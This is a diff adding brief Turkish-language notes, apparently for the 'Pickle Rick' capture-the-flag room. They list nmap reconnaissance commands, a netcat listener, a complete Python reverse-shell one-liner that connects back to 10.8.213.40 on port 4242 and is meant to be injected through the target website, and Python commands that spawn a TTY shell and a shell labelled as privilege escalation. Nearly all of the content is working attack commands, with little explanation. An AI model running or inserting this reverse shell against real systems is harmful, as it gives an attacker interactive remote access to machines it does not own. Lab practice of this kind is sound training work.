@@ -1,0 +1,20 @@
+Pickle rick
+
+---------NMAP---------
+nmap makineipadresi 
+
+nmap -sV makineipadresi      -sV = Sistem Versiyonlari Tariyoruz.
+
+nmap --script vuln makineipadresi    --script vuln Daha Once O portu kullanan uygulama veya portun kendisinde kefsedilen aciklari arastiriyoruz.
+
+
+----------Reverse Shell ve Yetki Yukseltme Komutlari ---------
+
+Terminale = nc -lvnp 4242
+websitesine=
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.213.40",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+Python TTY Shell= python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+Python Yetki Yukseltme = python3 -c 'import os; os.system("/bin/sh")'
+
